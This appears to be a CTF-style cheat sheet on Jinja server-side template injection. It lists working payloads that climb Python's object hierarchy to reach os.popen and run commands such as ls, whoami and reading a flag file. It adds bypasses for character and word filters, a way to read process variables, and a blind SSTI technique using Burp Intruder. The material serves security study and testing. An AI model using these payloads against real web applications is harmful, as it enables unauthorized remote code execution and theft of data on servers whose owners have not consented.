# Server-side Template Injection

## Jinja

### Basic injection

`{{7*7}}`

`{{config}}`

### RCE

The main goal of RCE through SSTI is to climb up the Python object hierachy, target is `__globals__.__builtins__.__import__`. 

Method 1:
1. Get `__class__` of any object
2. Get base Object class from the following *lists*
	* `__mro__`
		* Usually, the last item is the base Object.
	* `__bases__`
		* Usually, the only item is the base Object.
3. Get `__subclasses__()` and find a function that belongs to os or subprocess
	* `__subclasses__()` returns a list, to find the proper index:
		* Write a simple script (split output by comma, search for desired function's index)
		* CTRL+F and search "class", hit Enter until you reach desired function (index might be slightly off but can be faster than scripting)
		* Use Burp Intruder to fuzz (fast but overkill???)
4. The `__globals__` dict is in `__init__`
	* It should have `popen` (os) or `check_output` (subprocess)

> In Python 2, `string` is not directly under `object`, so `__base__[0]` twice

Method 2:
1. Get `__init__` of a Jinja object (self, cycler, joiner, namespace)
2. Get `__globals__`, a dict that has builtins at key `__builtins__`
3. `__builtins__` has `__import__` which we can use to import `os` 
	* Besides `__import__`, `__builtins__` also can have other functions like read(), eval() etc
	* It's however possible to set `__builtins__` to None, so this method is not foolproof
	* This method is more useful if you need to import certain modules that have the flag, rather than plain RCE


*Examples*

```py
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']("ls").read()}}
{{''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']("ls").read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

### Filter bypass

#### No {{ or }}

```py
{% print self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__["popen"]("whoami").read()[0] %}
```

#### [^\.]

```py
{{self["__class__"]}}
{{self|attr("__class__")}}

{{''['__class__']['__mro__'][1]['__subclasses__']()[117]["__init__"]["__globals__"]["popen"]("ls")["read"]()}}
{{self|attr("__init__")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("ls")|attr("read")()}}
```

#### [^_]

```py
{{self["\x5f\x5fclass\x5f\x5f"]}}
{{self|attr("\x5f\x5fclass\x5f\x5f)}}
```

#### [^'"]

This one is more advanced. We can exploit the built-in request Object in Flask to pass in any strings we like.

#### Cookies

```py
{{self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[request.cookies.f](request.cookies.cmd).read()}}
(Cookies: f=popen; cmd=ls)
```

##### GET query params

```py
{{self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[request.args.f](request.args.cmd).read()}}
(/?f=popen&cmd=ls)
```

Other ways to do this:
* POST (request.values.f)
* Headers (request.headers.f)

#### Word blacklist

```py
{{()|attr(request.cookies.f|format(request.cookies.a))|attr(request.cookies.mro)[-1]}}
(Cookies: f=__cl%sss__; a=a; mro=__mro__)
```

#### [^\[\]]

```py
{{''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.cookies.function)(request.cookies.cmd).read()}}
(Cookies: function=popen; cmd=ls)
```

#### [^'"\.0-9]

```py
{{lipsum[(dict(__globals__=x)|list)[False]][(dict(os=x)|list)[False]][(dict(popen=x)|list)[False]]([(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join)[(dict(daer=x)|list)[False]|reverse]()}}
```

### Read variables

If the goal isn't RCE but to read the value of a variable of the current process (might not be possible via RCE), we can import main and expose the variable.

```py
{{ self.__init__.__globals__['__builtins__']['__import__']('__main__') }}
```

### Blind SSTI

Sometimes the app might not have proper output for you to get your results. This is similar to Blind SQLi.

```py
{% if self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__["popen"]("whoami").read()[0] == 'r' %} 1 {% endif %}
```

Run it in Burp Intruder, don't forget to check for special characters like \n etc.


## References

* <https://chowdera.com/2020/12/20201221231521371q.html>
